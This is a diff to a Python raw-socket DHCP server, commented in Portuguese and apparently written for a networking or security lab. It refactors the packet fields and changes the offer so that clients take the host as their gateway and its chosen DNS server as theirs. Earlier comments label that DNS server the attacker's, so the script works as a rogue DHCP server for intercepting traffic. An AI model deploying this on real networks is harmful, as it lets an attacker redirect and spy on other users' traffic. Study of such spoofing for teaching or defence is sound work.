@@ -6,7 +6,7 @@ import uuid
 
 def get_mac_address():
     mac_int = uuid.getnode()  
-    mac_bytes = mac_int.to_bytes(6, byteorder='big')  # Converte bytes
+    mac_bytes = mac_int.to_bytes(6, byteorder='big')  # Converte para bytes
 
     # Formata
     mac = b''.join([bytes([int(b)]) for b in mac_bytes])
@@ -52,7 +52,8 @@ def dhcp_offer(transaction_id, server_mac, client_mac, server_ip, offered_ip, ma
     protocol = b'\x11'
     checksum = b'\x00\x00'
     source_ip = socket.inet_aton(server_ip)
-    dest_ip = b'\xff\xff\xff\xff'  # Broadcast --> Ip do cliente
+    #dest_ip = b'\xff\xff\xff\xff'  # Broadcast --> Ip do cliente
+    dest_ip = offered_ip
 
     ip_header = version + dsf + total_length + identification + fragment_offset + ttl + protocol + checksum + source_ip + dest_ip
 
@@ -79,17 +80,18 @@ def dhcp_offer(transaction_id, server_mac, client_mac, server_ip, offered_ip, ma
     xid = transaction_id  
     secs = b'\x00\x00'
     flags = b'\x00\x00'       
-    ciaddr = b'\x00\x00\x00\x00'
-    yiaddr = socket.inet_aton(offered_ip)
-    siaddr = socket.inet_aton(server_ip)
-    giaddr = b'\x00\x00\x00\x00'
-    chaddr = client_mac + b'\x00' * 10
-    sname = b'\x00' * 64
-    file = b'\x00' * 128
+    cli_addr = b'\x00\x00\x00\x00'
+    #your_cli_addr = socket.inet_aton(offered_ip)
+    your_cli_addr = offered_ip
+    next_server_ip_addr = socket.inet_aton(server_ip)
+    relay_agent_ip_addr = b'\x00\x00\x00\x00'
+    cli_mac = client_mac + b'\x00' * 10
+    server_host_name = b'\x00' * 64
+    file_name = b'\x00' * 128
     magic_cookie = b'\x63\x82\x53\x63'  
 
     # novo Header DHCP
-    dhcp_header = op + htype + hlen + hops + xid + secs + flags + ciaddr + yiaddr + siaddr + giaddr + chaddr + sname + file + magic_cookie
+    dhcp_header = op + htype + hlen + hops + xid + secs + flags + cli_addr + your_cli_addr + next_server_ip_addr + relay_agent_ip_addr + cli_mac + server_host_name + file_name + magic_cookie
 
     # DHCP options
     options = b''
@@ -97,7 +99,7 @@ def dhcp_offer(transaction_id, server_mac, client_mac, server_ip, offered_ip, ma
     options += b'\x01\x04' + socket.inet_aton(mascara)  # Mascara
     options += b'\x3a\x04\x00\x00\x07\x08'  # Renewal Time Value
     options += b'\x3b\x04\x00\x00\x0c\x4e'  # Rebinding Time Value
-    options += b'\x33\x04\x00\x00\x0e\x10'  # Lease time
+    options += b'\x33\x04\x00\x00\x0e\x10'  # Lease time 3600s
     options += b'\x36\x04' + socket.inet_aton(server_ip)    # DHCP Server
     options += b'\x03\x04' + socket.inet_aton(router_ip)  # Router
     options += b'\x06\x08' + socket.inet_aton(dns_ip) + socket.inet_aton(dns_ip) # DNS server
@@ -145,7 +147,9 @@ def dhcp_ack(transaction_id, server_mac, client_mac, server_ip, offered_ip, masc
     protocol = b'\x11'
     checksum = b'\x00\x00'
     source_ip = socket.inet_aton(server_ip)
-    dest_ip = b'\xff\xff\xff\xff'  # Broadcast --> Ip do cliente
+    #dest_ip = b'\xff\xff\xff\xff'  # Broadcast --> Ip do cliente
+    dest_ip = offered_ip
+
 
     ip_header = version + dsf + total_length + identification + fragment_offset + ttl + protocol + checksum + source_ip + dest_ip
 
@@ -154,7 +158,6 @@ def dhcp_ack(transaction_id, server_mac, client_mac, server_ip, offered_ip, masc
 
     # novo Header IP
     ip_header = version + dsf + total_length + identification + fragment_offset + ttl + protocol + ip_checksum + source_ip + dest_ip
-
 
     # UDP header
     source_port = b'\x00\x43'
@@ -172,27 +175,31 @@ def dhcp_ack(transaction_id, server_mac, client_mac, server_ip, offered_ip, masc
     hops = b'\x00'
     xid = transaction_id  
     secs = b'\x00\x00'
-    flags = b'\x80\x00'       # Broadcast flag
-    ciaddr = b'\x00\x00\x00\x00'
-    yiaddr = socket.inet_aton(offered_ip)
-    siaddr = socket.inet_aton(server_ip)
-    giaddr = b'\x00\x00\x00\x00'
-    chaddr = client_mac + b'\x00' * 10
-    sname = b'\x00' * 64
-    file = b'\x00' * 128
+    flags = b'\x00\x00'       
+    cli_addr = b'\x00\x00\x00\x00'
+    #your_cli_addr = socket.inet_aton(offered_ip)
+    your_cli_addr = offered_ip
+    next_server_ip_addr = b'\x00\x00\x00\x00'
+    relay_agent_ip_addr = b'\x00\x00\x00\x00'
+    cli_mac = client_mac + b'\x00' * 10 # com padding
+    server_host_name = b'\x00' * 64
+    file_name = b'\x00' * 128
     magic_cookie = b'\x63\x82\x53\x63'  
 
     # novo Header DHCP
-    dhcp_header = op + htype + hlen + hops + xid + secs + flags + ciaddr + yiaddr + siaddr + giaddr + chaddr + sname + file + magic_cookie
+    dhcp_header = op + htype + hlen + hops + xid + secs + flags + cli_addr + your_cli_addr + next_server_ip_addr + relay_agent_ip_addr + cli_mac + server_host_name + file_name + magic_cookie
 
     # DHCP options
     options = b''
     options += b'\x35\x01\x05'  # DHCP Ack
+    options += b'\x36\x04' + socket.inet_aton(server_ip) # DHCP Server 
+    options += b'\x33\x04\x00\x00\x0e\x10'  # Lease time 3600s
     options += b'\x01\x04' + socket.inet_aton(mascara)  # Mascara
     options += b'\x03\x04' + socket.inet_aton(router_ip)  # Router
-    options += b'\x06\x04' + socket.inet_aton(dns_ip)  # DNS server
-    options += b'\x33\x04\x00\x00\x0e\x10'  # Lease time
+    options += b'\x06\x08' + socket.inet_aton(dns_ip) +  socket.inet_aton(dns_ip) # DNS server
+    options += b'\x0f\x04\x00\x00\x00\x00' # Domain Name
     options += b'\xff'  # End 
+    options += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' # padding
 
     # Calcula UDP length e checksum
     udp_length = 8 + len(dhcp_header) + len(options)
@@ -218,20 +225,19 @@ def dhcp_ack(transaction_id, server_mac, client_mac, server_ip, offered_ip, masc
 # Função principal para executar o servidor DHCP
 def dhcp_server():
     hostname = socket.gethostname()
-
     server_ip = socket.gethostbyname(hostname)
     s = create_socket(server_ip)
     print("SERVER IP: ", server_ip)
-    print("Servidor em execução...")
-
     server_mac = get_mac_address()
     print("Server MAC: ", server_mac)
 
+    print("Servidor em execução...")
+
     # Dados
-    offered_ip = '192.168.1.100'
+    offered_ip = b'\xc0\xa8\x01\x64' #'192.168.1.100' # IP PARA OFFER
     mascara = '255.255.255.0'
-    router_ip = '192.168.1.1'
-    dns_ip = '8.8.8.8'      # DNS DO SERVIDOR ATACANTE
+    router_ip = server_ip
+    dns_ip = '8.8.8.8'      # IP DO SERVIDOR DNS A SER CONFIGURADO COM BIND9
 
     while True:
         try:
@@ -257,19 +263,18 @@ def dhcp_server():
             print("Transaction ID: ", transaction_id.hex())
             client_mac = packet[70-14:76-14]
             print("Client MAC: ", client_mac.hex())
+            #client_ip = ??
 
             # Envia Pacotes de Offer e Ack
             if message_type == 1:
                 print(f'DHCP Discover recebido de {addr}, enviando DHCP Offer')
                 packet = dhcp_offer(transaction_id, server_mac, client_mac, server_ip, offered_ip, mascara, router_ip, dns_ip)
                 s.sendto(packet, ('<broadcast>', 68))
-                #s.sendto(packet, (addr, 68))
 
             elif message_type == 3:
                 print(f'DHCP Request recebido de {addr}, enviando DHCP Acknowledgement')
                 packet = dhcp_ack(transaction_id, server_mac, client_mac, server_ip, offered_ip, mascara, router_ip, dns_ip)
                 s.sendto(packet, ('<broadcast>', 68))
-                #s.sendto(packet, (addr, 68))
         
         except BlockingIOError:
             pass
